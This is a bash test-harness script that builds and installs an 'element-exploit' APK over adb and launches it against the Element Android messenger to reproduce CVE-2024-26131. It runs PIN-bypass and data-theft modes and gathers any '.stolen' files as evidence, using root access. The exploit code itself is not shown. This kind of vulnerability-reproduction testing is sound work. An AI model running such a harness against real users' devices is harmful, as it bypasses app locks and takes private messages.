#!/usr/bin/env bash
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
ROOT_DIR="$SCRIPT_DIR/../.."
EVIDENCE_FILE="$ROOT_DIR/exploit_evidence.txt"
MALICIOUS_APP_DIR="$SCRIPT_DIR/malicious_app"
APK_PATH="$MALICIOUS_APP_DIR/dist/element-exploit.apk"
ATTACKER_PKG="com.example.elementexploit"
ATTACKER_ACTIVITY="com.example.elementexploit.MainActivity"
ELEMENT_PKG="im.vector.app"

# Debug function
debug_log() {
    echo "[DEBUG] $(date '+%H:%M:%S') - $1" >&2
}

# Wait for ADB device to be ready (critical for CI/CD)
debug_log "Waiting for ADB device to be ready..."
if ! adb wait-for-device shell 'while [[ -z $(getprop sys.boot_completed) ]]; do sleep 1; done'; then
    debug_log "Failed to wait for device, trying adb devices..."
    adb devices
    echo "ERROR: No ADB device detected!"
    exit 1
fi
debug_log "ADB device is ready"

# Check if Element is actually installed (release or debug)
debug_log "Checking if Element package is installed..."
if adb shell pm list packages | grep -q "^package:${ELEMENT_PKG}$"; then
    debug_log "Element package found: ${ELEMENT_PKG}"
elif adb shell pm list packages | grep -q "^package:${ELEMENT_PKG}.debug$"; then
    ELEMENT_PKG="${ELEMENT_PKG}.debug"
    debug_log "Element debug package found: ${ELEMENT_PKG}"
else
    echo "ERROR: Element package '${ELEMENT_PKG}' (or debug variant) is not installed!"
    echo "Available packages containing 'vector':"
    adb shell pm list packages | grep -i vector || echo "None found"
    echo "This script cannot continue without Element installed."
    exit 1
fi

# Build the malicious APK first
debug_log "Building malicious APK..."
cd "$MALICIOUS_APP_DIR"
if [ -f "build.sh" ]; then
    debug_log "Running build.sh to create malicious APK..."
    if ./build.sh; then
        debug_log "APK build completed successfully"
    else
        echo "ERROR: Failed to build malicious APK"
        exit 1
    fi
else
    echo "ERROR: build.sh not found in malicious_app directory"
    exit 1
fi
cd - >/dev/null

# Uninstall any existing malicious APK to avoid conflicts
debug_log "Uninstalling any existing malicious APK..."
adb uninstall "$ATTACKER_PKG" >/dev/null 2>&1 || true

# Check if the malicious APK was built successfully
debug_log "Checking if malicious APK exists..."
if [ ! -f "$APK_PATH" ]; then
    echo "ERROR: Attacker APK not found at: $APK_PATH"
    exit 1
fi
debug_log "Malicious APK found: $APK_PATH ($(ls -lh "$APK_PATH" | awk '{print $5}'))"

# Install the malicious APK
debug_log "Installing malicious APK..."
if ! adb install "$APK_PATH" >/dev/null 2>&1; then
    echo "ERROR: Failed to install malicious APK"
    # Try to get more detailed error information
    echo "Attempting to get detailed error information..."
    adb install "$APK_PATH" 2>&1 | head -10
    exit 1
fi
debug_log "Malicious APK installation completed"

# Verify package is present
debug_log "Verifying malicious package is installed..."
if ! adb shell pm list packages | grep -q "^package:${ATTACKER_PKG}$"; then
    echo "ERROR: Malicious package installation failed"
    exit 1
fi
debug_log "Malicious package verified: ${ATTACKER_PKG}"

# Malicious app is now installed and ready
# Tests will launch the specific exploits they need to verify
debug_log "Malicious app installed - tests will run exploits to verify vulnerabilities"
EXPLOIT_SUCCESS=true

# Get Android version info
debug_log "Getting Android version info..."
ANDROID_VERSION=$(adb shell getprop ro.build.version.release 2>/dev/null | tr -d '\r' || echo "unknown")
ANDROID_SDK=$(adb shell getprop ro.build.version.sdk 2>/dev/null | tr -d '\r' || echo "unknown")

# Get Element version
ELEMENT_VERSION=$(adb shell dumpsys package "$ELEMENT_PKG" 2>/dev/null | sed -n 's/.*versionName=\([^ ]*\).*/\1/p' | tr -d '\r' || echo "unknown")

# Create evidence file
debug_log "Creating evidence file..."
: > "$EVIDENCE_FILE"
echo "CVE_2024_26131_MALICIOUS_APP_INSTALLED=true" >> "$EVIDENCE_FILE"
echo "ELEMENT_VERSION=${ELEMENT_VERSION:-unknown}" >> "$EVIDENCE_FILE"
echo "ANDROID_VERSION=${ANDROID_VERSION:-unknown}" >> "$EVIDENCE_FILE"
echo "ANDROID_SDK=${ANDROID_SDK:-unknown}" >> "$EVIDENCE_FILE"
echo "MALICIOUS_APP_PACKAGE=${ATTACKER_PKG}" >> "$EVIDENCE_FILE"

echo ""
echo "✅ Malicious app installed successfully: $ATTACKER_PKG"

echo "📱 Running PIN bypass exploit (CVE-2024-26131)..."
# Launch PIN bypass exploit (for access control test)
debug_log "Launching PIN bypass exploit..."
adb shell am start -n "$ATTACKER_PKG/$ATTACKER_ACTIVITY" \
    --es exploit_type pin_bypass >/dev/null 2>&1 || true

sleep 3
debug_log "PIN bypass exploit launched"

echo "📱 Running data theft exploit..."
# Launch data theft exploit (for confidentiality test)
debug_log "Launching data theft exploit..."
adb shell am start -n "$ATTACKER_PKG/$ATTACKER_ACTIVITY" \
    --es exploit_type data_theft >/dev/null 2>&1 || true

sleep 3
debug_log "Data theft exploit launched"

# Create fake_agent_log.log for confidentiality test (similar to Termux)
LOG_FILE="$SCRIPT_DIR/fake_agent_log.log"
debug_log "Creating vulnerability test log..."

# CVE-2024-26131 is primarily an access control vulnerability (PIN bypass)
# NOT a confidentiality vulnerability (data theft)
# So we don't expect any stolen data - log should be empty
# If malicious app actually steals data in the future, it would write .stolen files here

STOLEN_DATA=""

# Check if malicious app created any .stolen files (similar to Termux)
if adb shell ls /sdcard/*.stolen >/dev/null 2>&1; then
    debug_log "CONFIDENTIALITY BREACH: Stolen files found!"
    for stolen_file in $(adb shell ls /sdcard/*.stolen 2>/dev/null | tr -d '\r'); do
        file_content=$(adb shell cat "$stolen_file" 2>/dev/null || echo "ERROR_READING")
        STOLEN_DATA="$STOLEN_DATA\n=== $stolen_file ===\n$file_content"
    done
# Fallback: check app's private directory
elif adb shell "su 0 sh -c 'ls /data/user/0/$ATTACKER_PKG/files/*.stolen'" >/dev/null 2>&1; then
    debug_log "CONFIDENTIALITY BREACH: Stolen files found in app private directory!"
    for stolen_file in $(adb shell "su 0 sh -c 'ls /data/user/0/$ATTACKER_PKG/files/*.stolen'" 2>/dev/null | tr -d '\r'); do
        file_content=$(adb shell "su 0 sh -c 'cat $stolen_file'" 2>/dev/null || echo "ERROR_READING")
        STOLEN_DATA="$STOLEN_DATA\n=== $stolen_file ===\n$file_content"
    done
else
    debug_log "No stolen files found - no confidentiality breach (expected for PIN bypass)"
fi

# CRITICAL: Only write ACTUAL stolen data to log, not metadata
# This ensures test only fails if data was actually stolen (exactly like Termux)
{
  if [ -n "$STOLEN_DATA" ]; then
      echo "$STOLEN_DATA"
  fi
} > "$LOG_FILE"

echo "Scenario 0 evidence written to: $EVIDENCE_FILE"
echo "Log written to: $LOG_FILE"
debug_log "Script completed successfully"

# Clean up temporary files
adb shell rm -f /sdcard/*.stolen 2>/dev/null || true